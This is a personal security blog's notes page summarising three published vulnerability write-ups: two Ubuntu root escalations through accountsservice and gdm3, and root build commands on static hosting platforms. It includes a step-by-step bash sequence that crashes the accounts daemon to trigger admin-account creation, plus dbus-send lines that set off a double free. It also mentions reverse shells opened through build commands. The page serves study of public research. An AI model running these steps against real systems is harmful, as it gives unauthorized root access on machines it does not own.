<!doctype html>
<html class="docs-version-current" lang="en" dir="ltr">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<meta name="generator" content="Docusaurus v2.0.0-beta.14">
<link rel="alternate" type="application/rss+xml" href="/the-nest/blog/rss.xml" title="The Nest RSS Feed">
<link rel="alternate" type="application/atom+xml" href="/the-nest/blog/atom.xml" title="The Nest Atom Feed"><title data-react-helmet="true">Summary | The Nest</title><meta data-react-helmet="true" name="twitter:card" content="summary_large_image"><meta data-react-helmet="true" property="og:url" content="https://crystalwwj.github.io//the-nest/docs/cybersecurity/random-notes/summary"><meta data-react-helmet="true" name="docusaurus_locale" content="en"><meta data-react-helmet="true" name="docusaurus_version" content="current"><meta data-react-helmet="true" name="docusaurus_tag" content="docs-default-current"><meta data-react-helmet="true" property="og:title" content="Summary | The Nest"><meta data-react-helmet="true" name="description" content="One thing I&#x27;ve noticed about reading CVE reports and writeups is that I get the thrill of learning once I&#x27;ve read through and (hopefully) understood the vulnerability, but in a few months or even in a few weeks I&#x27;ll forget 80% of the content. Sometimes I even re-read reports because I forgot that I already read them. So as a simple memo and also an exercise to keep me reading new research, I&#x27;ve decided to do a little summary of the stuff I read so I can keep track and have some reference later on. Like a book review, sort of."><meta data-react-helmet="true" property="og:description" content="One thing I&#x27;ve noticed about reading CVE reports and writeups is that I get the thrill of learning once I&#x27;ve read through and (hopefully) understood the vulnerability, but in a few months or even in a few weeks I&#x27;ll forget 80% of the content. Sometimes I even re-read reports because I forgot that I already read them. So as a simple memo and also an exercise to keep me reading new research, I&#x27;ve decided to do a little summary of the stuff I read so I can keep track and have some reference later on. Like a book review, sort of."><link data-react-helmet="true" rel="icon" href="/the-nest/img/favicon.ico"><link data-react-helmet="true" rel="canonical" href="https://crystalwwj.github.io//the-nest/docs/cybersecurity/random-notes/summary"><link data-react-helmet="true" rel="alternate" href="https://crystalwwj.github.io//the-nest/docs/cybersecurity/random-notes/summary" hreflang="en"><link data-react-helmet="true" rel="alternate" href="https://crystalwwj.github.io//the-nest/docs/cybersecurity/random-notes/summary" hreflang="x-default"><link rel="stylesheet" href="/the-nest/assets/css/styles.d9d837ef.css">
<link rel="preload" href="/the-nest/assets/js/runtime~main.a15cc5f4.js" as="script">
<link rel="preload" href="/the-nest/assets/js/main.b94ae020.js" as="script">
</head>
<body>
<script>!function(){function t(t){document.documentElement.setAttribute("data-theme",t)}var e=function(){var t=null;try{t=localStorage.getItem("theme")}catch(t){}return t}();t(null!==e?e:"light")}()</script><div id="__docusaurus">
<div><a href="#" class="skipToContent_OuoZ">Skip to main content</a></div><nav class="navbar navbar--fixed-top"><div class="navbar__inner"><div class="navbar__items"><button aria-label="Navigation bar toggle" class="navbar__toggle clean-btn" type="button" tabindex="0"><svg width="30" height="30" viewBox="0 0 30 30" aria-hidden="true"><path stroke="currentColor" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" d="M4 7h22M4 15h22M4 23h22"></path></svg></button><a class="navbar__brand" href="/the-nest/"><div class="navbar__logo"><img src="/the-nest/img/logo.svg" alt="The Nest" class="themedImage_TMUO themedImage--light_4Vu1"><img src="/the-nest/img/logo.svg" alt="The Nest" class="themedImage_TMUO themedImage--dark_uzRr"></div><b class="navbar__title">The Nest</b></a><a class="navbar__item navbar__link navbar__link--active" href="/the-nest/docs/intro">Notes</a><a class="navbar__item navbar__link" href="/the-nest/blog">Blog</a></div><div class="navbar__items navbar__items--right"><a href="https://github.com/crystalwwj/the-nest/edit/main" target="_blank" rel="noopener noreferrer" class="navbar__item navbar__link"><span>GitHub<svg width="13.5" height="13.5" aria-hidden="true" viewBox="0 0 24 24" class="iconExternalLink_wgqa"><path fill="currentColor" d="M21 13v10h-21v-19h12v2h-10v15h17v-8h2zm3-12h-10.988l4.035 4-6.977 7.07 2.828 2.828 6.977-7.07 4.125 4.172v-11z"></path></svg></span></a><div class="toggle_iYfV toggle_2i4l toggleDisabled_xj38"><div class="toggleTrack_t-f2" role="button" tabindex="-1"><div class="toggleTrackCheck_mk7D"><span class="toggleIcon_pHJ9">ğŸŒœ</span></div><div class="toggleTrackX_dm8H"><span class="toggleIcon_pHJ9">ğŸŒ</span></div><div class="toggleTrackThumb_W6To"></div></div><input type="checkbox" class="toggleScreenReader_h9qa" aria-label="Switch between dark and light mode"></div></div></div><div role="presentation" class="navbar-sidebar__backdrop"></div></nav><div class="main-wrapper docs-wrapper docs-doc-page"><div class="docPage_lDyR"><button aria-label="Scroll back to top" class="clean-btn theme-back-to-top-button backToTopButton_i9tI" type="button"></button><aside class="docSidebarContainer_0YBq"><div class="sidebar_a3j0"><nav class="menu thin-scrollbar menu_cyFh"><ul class="theme-doc-sidebar-menu menu__list"><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-1 menu__list-item"><a class="menu__link" href="/the-nest/docs/intro">Tutorial Intro</a></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist hasHref_TwRn" href="/the-nest/docs/tutorial-basics/create-a-page">Tutorial - Basics</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--active hasHref_TwRn" href="/the-nest/docs/cybersecurity/pentest-notes/intro">Cybersecurity</a></div><ul style="display:block;overflow:visible;height:auto" class="menu__list"><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist hasHref_TwRn" tabindex="0" href="/the-nest/docs/cybersecurity/pentest-notes/intro">Pentest Notes</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--active hasHref_TwRn" tabindex="0" href="/the-nest/docs/cybersecurity/random-notes/intro">Random Notes</a></div><ul style="display:block;overflow:visible;height:auto" class="menu__list"><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/the-nest/docs/cybersecurity/random-notes/intro">Intro</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link menu__link--active" aria-current="page" tabindex="0" href="/the-nest/docs/cybersecurity/random-notes/summary">Summary</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/the-nest/docs/cybersecurity/random-notes/mem-alloc">Memory Allocation</a></li></ul></li></ul></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist hasHref_TwRn" href="/the-nest/docs/investment/future">Investment</a></div></li></ul></nav></div></aside><main class="docMainContainer_r8cw"><div class="container padding-top--md padding-bottom--lg"><div class="row"><div class="col docItemCol_zHA2"><div class="docItemContainer_oiyr"><article><div class="tocCollapsible_aw-L theme-doc-toc-mobile tocMobile_Tx6Y"><button type="button" class="clean-btn tocCollapsibleButton_zr6a">On this page</button></div><div class="theme-doc-markdown markdown"><header><h1>Summary</h1></header><p>One thing I&#x27;ve noticed about reading CVE reports and writeups is that I get the thrill of learning once I&#x27;ve read through and (hopefully) understood the vulnerability, but in a few months or even in a few weeks I&#x27;ll forget 80% of the content. Sometimes I even re-read reports because I forgot that I already read them. So as a simple memo and also an exercise to keep me reading new research, I&#x27;ve decided to do a little summary of the stuff I read so I can keep track and have some reference later on. Like a book review, sort of.</p><p>Here&#x27;s to define the format:
Title: <!-- -->[<!-- -->category<!-- -->]<!-- --> Title of blog/research</p><ul><li>CVE</li><li>author(s) or org</li><li>link to resource(s)</li><li>category(s), e.g privesc, webapp, android...</li><li>keywords</li></ul><p>Description of vuln, technical details worth noting, lessons learned, questions or extended research, link to other notes, etc</p><h2 class="anchor anchorWithStickyNavbar_y2LR" id="privesc-how-to-get-root-on-ubuntu-2004-by-pretending-nobodys-home">[<!-- -->Privesc<!-- -->]<!-- --> How to get root on Ubuntu 20.04 by pretending nobodyâ€™s /home<a class="hash-link" href="#privesc-how-to-get-root-on-ubuntu-2004-by-pretending-nobodys-home" title="Direct link to heading">â€‹</a></h2><ul><li>CVE: CVE-2020-16126, CVE-2020-16127, CVE-2020-16125</li><li>Author: Kevin Backhouse of the GitHub Security Lab</li><li><a href="https://securitylab.github.com/research/Ubuntu-gdm3-accountsservice-LPE/" target="_blank" rel="noopener noreferrer">How to get root on Ubuntu 20.04 by pretending nobodyâ€™s /home</a></li><li>Categories: Privesc, Linux</li><li>Keywords: pam_environment, Ubuntu GNOME Display Manager (gdm3), accountsservice, D-Bus</li></ul><h3 class="anchor anchorWithStickyNavbar_y2LR" id="description">Description<a class="hash-link" href="#description" title="Direct link to heading">â€‹</a></h3><p>The privesc technique chains 2 bugs: the first a DoS bug to crash the accountsservice daemon, and the second a design flaw that causes the dependent gdm3 to create a n admin account when the accountsservice daemon is unresponsive.</p><h4 class="anchor anchorWithStickyNavbar_y2LR" id="the-accountsservice-daemon-bug">The accountsservice daemon bug<a class="hash-link" href="#the-accountsservice-daemon-bug" title="Direct link to heading">â€‹</a></h4><p>The accountsservice daemon manages user accounts and also allows you to change your settings, such as your icon or preferred language. Messages are sent via D-Bus between the graphic dialog box and the accountsservice daemon. When a config file, <code>~/.pam_environment</code> is found for a user, Ubuntu&#x27;s accountsservice daemon (which is different from the upstream maintained version) reads it. We can <strong>symlink this file to <code>/dev/zero</code></strong> to trigger the DoS since <code>/dev/zero</code> is logically an infinitely long file with <code>\x00</code>.</p><p>We can then crash the unresponsive accountsservice daemon by sending a SIGSEGV signal. This is possible because the accountsservice daemon drops privs before reading <code>.pam_environment</code> which is a protection against low-priv users trying to read high-priv files like <code>/etc/shadow</code>.</p><h4 class="anchor anchorWithStickyNavbar_y2LR" id="the-gdm3-privesc-bug">The gdm3 privesc bug<a class="hash-link" href="#the-gdm3-privesc-bug" title="Direct link to heading">â€‹</a></h4><p>There is an operation called <code>gnome-initial-setup</code> which is triggered when gdm3 detects that there are zero users on the system, or in other words, this is a fresh installation of Ubuntu. The <code>gnome-initial-setup</code> process creates an admin account so you can then perform other setup. The problem is: <strong>gdm3 queries the accountsservice daemon for the number of user accounts</strong>, and when the accountsservice daemon is unresponsive, gdm3 by default believes that there are 0 users, and triggers <code>gnome-initial-setup</code>.</p><p>Quoting the blog:</p><blockquote><p>You tricked gdm into launching gnome-initial-setup, I reckon, which maybe happens if a gdm session canâ€™t verify that an account already exists.</p></blockquote><h3 class="anchor anchorWithStickyNavbar_y2LR" id="exploit">Exploit<a class="hash-link" href="#exploit" title="Direct link to heading">â€‹</a></h3><p><strong>Limitations: You need graphical session on machine!</strong></p><div class="codeBlockContainer_J+bg language-bash theme-code-block"><div class="codeBlockContent_csEI bash"><pre tabindex="0" class="prism-code language-bash codeBlock_rtdJ thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_1zSZ"><span class="token-line" style="color:#393A34"><span class="token comment" style="color:#999988;font-style:italic"># symlink .pam_environment to /dev/zero to trigger DoS</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token function" style="color:#d73a49">ln</span><span class="token plain"> -s /dev/zero .pam_environment</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># open &quot;Region &amp; Language&quot; in system settings and change language, ignore the freeze</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># delete symlink</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token function" style="color:#d73a49">rm</span><span class="token plain"> .pam_environment</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># kill process</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">pidof accounts-daemon</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token function" style="color:#d73a49">kill</span><span class="token plain"> -SIGSTOP </span><span class="token number" style="color:#36acaa">597</span><span class="token plain">   </span><span class="token comment" style="color:#999988;font-style:italic"># change to pid</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># need to log out to trigger, but set timer to restart accountsservice daemon</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token function" style="color:#d73a49">nohup</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">bash</span><span class="token plain"> -c </span><span class="token string" style="color:#e3116c">&quot;sleep 30s; kill -SIGSEGV 597; kill -SIGCONT 597&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># logout and wait for prompt to create admin account!</span><br></span></code></pre><button type="button" aria-label="Copy code to clipboard" class="copyButton_M3SB clean-btn">Copy</button></div></div><h3 class="anchor anchorWithStickyNavbar_y2LR" id="takeaways-and-notes">Takeaways and Notes<a class="hash-link" href="#takeaways-and-notes" title="Direct link to heading">â€‹</a></h3><ul><li>DoS bugs might be categorized as trivial, but its importantance may sky-rocket if other applications are dependent on it. Maybe try to research how past DoS bugs might be chained with quirky behavior?</li><li>polkit is often used to check if a client is authorized to request an action -&gt; find more info on this?</li></ul><h2 class="anchor anchorWithStickyNavbar_y2LR" id="privesc-getting-root-on-ubuntu-through-wishful-thinking">[<!-- -->Privesc<!-- -->]<!-- --> Getting root on Ubuntu through wishful thinking<a class="hash-link" href="#privesc-getting-root-on-ubuntu-through-wishful-thinking" title="Direct link to heading">â€‹</a></h2><ul><li>CVE: CVE-2021-3939</li><li>Author: Kevin Backhouse of the GitHub Security Lab</li><li><a href="https://securitylab.github.com/research/ubuntu-accountsservice-CVE-2021-3939/" target="_blank" rel="noopener noreferrer">Getting root on Ubuntu through wishful thinking</a></li><li>Categories: Privesc, Linux</li><li>Keywords: double free, UAF, accountsservice, polkit</li></ul><h3 class="anchor anchorWithStickyNavbar_y2LR" id="description-1">Description<a class="hash-link" href="#description-1" title="Direct link to heading">â€‹</a></h3><h4 class="anchor anchorWithStickyNavbar_y2LR" id="double-free-in-accountsservice">Double free in accountsservice<a class="hash-link" href="#double-free-in-accountsservice" title="Direct link to heading">â€‹</a></h4><p>A pointer, <code>system_formats_locale</code>, is allocated as <strong>static</strong> and returned to caller, so there is only one instance and the caller should not free it. However, in one of the functions it&#x27;s called and assigned to <code>g_autofree</code>, which means it gets freed when execution exits current scope! This is usually okay because code looks into <code>.pam_environment</code> for backup values, so we can trigger double free by deleting <code>.pam_environment</code>!</p><div class="codeBlockContainer_J+bg language-bash theme-code-block"><div class="codeBlockContent_csEI bash"><pre tabindex="0" class="prism-code language-bash codeBlock_rtdJ thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_1zSZ"><span class="token-line" style="color:#393A34"><span class="token function" style="color:#d73a49">rm</span><span class="token plain"> -f ~/.pam_environment</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">dbus-send --system --print-reply --dest</span><span class="token operator" style="color:#393A34">=</span><span class="token plain">org.freedesktop.Accounts /org/freedesktop/Accounts/User1001 org.freedesktop.Accounts.User.SetLanguage string:hi</span><br></span></code></pre><button type="button" aria-label="Copy code to clipboard" class="copyButton_M3SB clean-btn">Copy</button></div></div><p>So now a dangling pointer is in <code>system_formats_locale</code> while other parts of code can write the chunk. </p><h3 class="anchor anchorWithStickyNavbar_y2LR" id="exploit-1">Exploit<a class="hash-link" href="#exploit-1" title="Direct link to heading">â€‹</a></h3><p>Problems:</p><ul><li>chunk size only <code>0x20</code></li><li>bypass ASLR randomness</li></ul><p>Author observed that the chunk is often captured by the <code>user_save_to_keyfile()</code> function. Why not use this alloc dealloc to jumble up memory and increase chances of another useful target allocating the chunk? We can keep crashing and restarting accountsservice as a low-priv user by changing email:</p><div class="codeBlockContainer_J+bg language-bash theme-code-block"><div class="codeBlockContent_csEI bash"><pre tabindex="0" class="prism-code language-bash codeBlock_rtdJ thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_1zSZ"><span class="token-line" style="color:#393A34"><span class="token plain">dbus-send --system --dest</span><span class="token operator" style="color:#393A34">=</span><span class="token plain">org.freedesktop.Accounts --type</span><span class="token operator" style="color:#393A34">=</span><span class="token plain">method_call --print-reply /org/freedesktop/Accounts/User1001 org.freedesktop.Accounts.User.SetEmail string:</span><span class="token string" style="color:#e3116c">&#x27;kev@example.com&#x27;</span><br></span></code></pre><button type="button" aria-label="Copy code to clipboard" class="copyButton_M3SB clean-btn">Copy</button></div></div><p>Due to small chunk size, we need to find something interesting that can happen when data is overwritten, such as changing the current user&#x27;s username to root. The final target is <code>CheckAuthData</code>, which is used to <strong>store a closure that will be called after the polkit request is approved</strong>. Since method call is async, we want to trigger double free between a low-priv request and high-priv request so that the high-priv function pointer overwrites the low-priv one while the low-priv request gets approved.</p><p>Drew a diagram to illustrate the flow:</p><p><img alt="Exploit flow" src="/the-nest/assets/images/root-ubuntu-wishful-thinking-5c807d5eaae855f3257c5b0a80b15d0b.png"></p><p>Unfortunately, the <code>CheckAuthData</code> in accountsservice is <code>0x40</code>, so the mismatch would&#x27;ve ruined the exploit. HOWEVER, it actually worked, because there&#x27;s also a <code>CheckAuthData</code> struct in the <strong>polkit client-side library</strong> which does exactly the same thing, but is small enough for <code>0x20</code>! The exploit flow is mostly the same, except the double free corrupts the chunk used by polkit!</p><h3 class="anchor anchorWithStickyNavbar_y2LR" id="takeaways-and-notes-1">Takeaways and Notes<a class="hash-link" href="#takeaways-and-notes-1" title="Direct link to heading">â€‹</a></h3><ul><li>Textbook UAF taught us to write chunk with shellcode or ROP chain, leak addrs, then jump over, but sometimes it&#x27;s more useful to see where the chunk might get allocated and what data you can overwrite! Privesc doesn&#x27;t always need revshell</li><li>Can do a bit of research on possible exploitable type combinations in different languages, e.g <code>static</code> and <code>g_autofree</code> variables</li></ul><h2 class="anchor anchorWithStickyNavbar_y2LR" id="rce-é™æ€ç«™ç‚¹æ‰˜ç®¡å¹³å°ä»…èƒ½æ‰˜ç®¡é™æ€èµ„æº">[<!-- -->RCE<!-- -->]<!-- --> é™æ€ç«™ç‚¹æ‰˜ç®¡å¹³å°ä»…èƒ½æ‰˜ç®¡é™æ€èµ„æºï¼Ÿ<a class="hash-link" href="#rce-é™æ€ç«™ç‚¹æ‰˜ç®¡å¹³å°ä»…èƒ½æ‰˜ç®¡é™æ€èµ„æº" title="Direct link to heading">â€‹</a></h2><ul><li>CVE: N/A</li><li>Author: zjun</li><li><a href="https://tttang.com/archive/1501/" target="_blank" rel="noopener noreferrer">é™æ€ç«™ç‚¹æ‰˜ç®¡å¹³å°ä»…èƒ½æ‰˜ç®¡é™æ€èµ„æºï¼Ÿ</a></li><li>Categories: RCE, Cloud</li><li>Keywords: container security, static site generator</li></ul><h3 class="anchor anchorWithStickyNavbar_y2LR" id="description-2">Description<a class="hash-link" href="#description-2" title="Direct link to heading">â€‹</a></h3><p>Several cloud hosting services support various static site generation frameworks, which often allow us to build and run with custom commands. Though such commands should always be executed in a low-privileged restricted container, cloud services are too commmonly misconfigured. In this post, the author explores several platforms, including 4everland, vercel, and netlify. A friend also discovered that Cloudflare has the same vulnerability.</p><h3 class="anchor anchorWithStickyNavbar_y2LR" id="exploit-2">Exploit<a class="hash-link" href="#exploit-2" title="Direct link to heading">â€‹</a></h3><p>4everland, an IPFS build on web3, runs on AliCloud and executes commands as <strong>root</strong>, but the site has protections in place to restrict available commands and container escape. The author did not successfully pop a reverse shell.</p><p>Vercel, similar to GitHub pages, runs on AWS and also executes commands as <strong>root</strong>, but allows much more commands. The author can pop a reverse shell by installing <code>nc</code> with yum or via python. The downside is that the job timeouts after 45 minutes, so it&#x27;s harder to obtain persistent access.</p><p>Netlify, also similar to GitHub pages, runs on AWS, but executes commands as a low-priv user <code>buildbot</code>. We can&#x27;t install packages without root privileges, so this case isn&#x27;t of much use.</p><p>Our friend was using Cloudflare and found the same issue. Commands are run as <strong>root</strong> but timeouts pretty quickly, and the platforms become unusable for a while. The kernel version is out of date so there probably are kernel weaknesses that we can exploit to escalate privileges or escape the container, but we haven&#x27;t confirmed this.</p><p>In all, unless we can escape the container or laterally move to other machines, this weakness isn&#x27;t too valuable. If you just want to use free containers though, it&#x27;s a nice feature ;D</p></div><footer class="theme-doc-footer docusaurus-mt-lg"><div class="theme-doc-footer-edit-meta-row row"><div class="col"><a href="https://github.com/crystalwwj/the-nest/edit/main/docs/cybersecurity/random-notes/summary.md" target="_blank" rel="noreferrer noopener" class="theme-edit-this-page"><svg fill="currentColor" height="20" width="20" viewBox="0 0 40 40" class="iconEdit_mS5F" aria-hidden="true"><g><path d="m34.5 11.7l-3 3.1-6.3-6.3 3.1-3q0.5-0.5 1.2-0.5t1.1 0.5l3.9 3.9q0.5 0.4 0.5 1.1t-0.5 1.2z m-29.5 17.1l18.4-18.5 6.3 6.3-18.4 18.4h-6.3v-6.2z"></path></g></svg>Edit this page</a></div><div class="col lastUpdated_mt2f"></div></div></footer></article><nav class="pagination-nav docusaurus-mt-lg" aria-label="Docs pages navigation"><div class="pagination-nav__item"><a class="pagination-nav__link" href="/the-nest/docs/cybersecurity/random-notes/intro"><div class="pagination-nav__sublabel">Previous</div><div class="pagination-nav__label">Intro</div></a></div><div class="pagination-nav__item pagination-nav__item--next"><a class="pagination-nav__link" href="/the-nest/docs/cybersecurity/random-notes/mem-alloc"><div class="pagination-nav__sublabel">Next</div><div class="pagination-nav__label">Memory Allocation</div></a></div></nav></div></div><div class="col col--3"><div class="tableOfContents_vrFS thin-scrollbar theme-doc-toc-desktop"><ul class="table-of-contents table-of-contents__left-border"><li><a href="#privesc-how-to-get-root-on-ubuntu-2004-by-pretending-nobodys-home" class="table-of-contents__link toc-highlight">[Privesc] How to get root on Ubuntu 20.04 by pretending nobodyâ€™s /home</a><ul><li><a href="#description" class="table-of-contents__link toc-highlight">Description</a></li><li><a href="#exploit" class="table-of-contents__link toc-highlight">Exploit</a></li><li><a href="#takeaways-and-notes" class="table-of-contents__link toc-highlight">Takeaways and Notes</a></li></ul></li><li><a href="#privesc-getting-root-on-ubuntu-through-wishful-thinking" class="table-of-contents__link toc-highlight">[Privesc] Getting root on Ubuntu through wishful thinking</a><ul><li><a href="#description-1" class="table-of-contents__link toc-highlight">Description</a></li><li><a href="#exploit-1" class="table-of-contents__link toc-highlight">Exploit</a></li><li><a href="#takeaways-and-notes-1" class="table-of-contents__link toc-highlight">Takeaways and Notes</a></li></ul></li><li><a href="#rce-é™æ€ç«™ç‚¹æ‰˜ç®¡å¹³å°ä»…èƒ½æ‰˜ç®¡é™æ€èµ„æº" class="table-of-contents__link toc-highlight">[RCE] é™æ€ç«™ç‚¹æ‰˜ç®¡å¹³å°ä»…èƒ½æ‰˜ç®¡é™æ€èµ„æºï¼Ÿ</a><ul><li><a href="#description-2" class="table-of-contents__link toc-highlight">Description</a></li><li><a href="#exploit-2" class="table-of-contents__link toc-highlight">Exploit</a></li></ul></li></ul></div></div></div></div></main></div></div><footer class="footer footer--dark"><div class="container container-fluid"><div class="row footer__links"><div class="col footer__col"><div class="footer__title">Docs</div><ul class="footer__items"><li class="footer__item"><a class="footer__link-item" href="/the-nest/docs/intro">Tutorial</a></li></ul></div><div class="col footer__col"><div class="footer__title">More</div><ul class="footer__items"><li class="footer__item"><a class="footer__link-item" href="/the-nest/blog">Blog</a></li><li class="footer__item"><a href="https://github.com/cymetrics" target="_blank" rel="noopener noreferrer" class="footer__link-item"><span>GitHub<svg width="13.5" height="13.5" aria-hidden="true" viewBox="0 0 24 24" class="iconExternalLink_wgqa"><path fill="currentColor" d="M21 13v10h-21v-19h12v2h-10v15h17v-8h2zm3-12h-10.988l4.035 4-6.977 7.07 2.828 2.828 6.977-7.07 4.125 4.172v-11z"></path></svg></span></a></li></ul></div></div><div class="footer__bottom text--center"><div class="footer__copyright">Copyright Â© 2022 The Nest, Built with Docusaurus.</div></div></div></footer></div>
<script src="/the-nest/assets/js/runtime~main.a15cc5f4.js"></script>
<script src="/the-nest/assets/js/main.b94ae020.js"></script>
</body>
</html>